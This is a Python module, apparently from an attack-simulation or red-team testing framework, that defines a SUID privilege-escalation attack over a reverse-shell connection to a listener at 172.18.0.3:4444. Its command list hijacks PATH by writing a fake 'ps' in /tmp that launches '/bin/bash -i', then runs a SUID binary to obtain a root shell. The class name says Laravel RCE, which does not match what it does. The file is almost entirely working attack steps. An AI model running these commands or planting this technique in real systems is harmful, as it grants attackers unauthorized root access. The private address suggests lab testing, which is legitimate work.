import base64
import os

from attacks import AttackInfo
from attacks.reverse_shell_attack_options import ReverseShellAttack, ReverseShellAttackOptions


class SuidPrivEscAttackOptions(ReverseShellAttackOptions):

    def _set_defaults(self) -> None:
        super()._set_defaults()
        self.lhost = "172.18.0.3"
        self.lport = "4444"


class LaravelRCEAttack(ReverseShellAttack):
    info: AttackInfo = AttackInfo(
        name="priv_escalation_suid",
        description="use suid to escalate privilege to root",
    )
    options_class = SuidPrivEscAttackOptions

    def run(self) -> None:
        self.connect_to_target()
        with self.check_printed(f"root"):
            with self.wrap_ssh_exceptions():
                self.exec_commands_on_shell(self.commands)

    def _append_command(self):
        exec_file = "/home/breach/shell"
        directory = os.path.dirname(exec_file)
        filename = os.path.basename(exec_file)
        self.commands.extend([
            "/home/breach/shell",  # guess the function of shell
            'echo "/bin/bash -i" > /tmp/ps',
            'chmod 777 /tmp/ps',
            'echo $PATH',
            'export PATH=/tmp:$PATH',
            f'cd {directory}',
            f'./{filename}',
            f'id',  # get root privilege
        ])
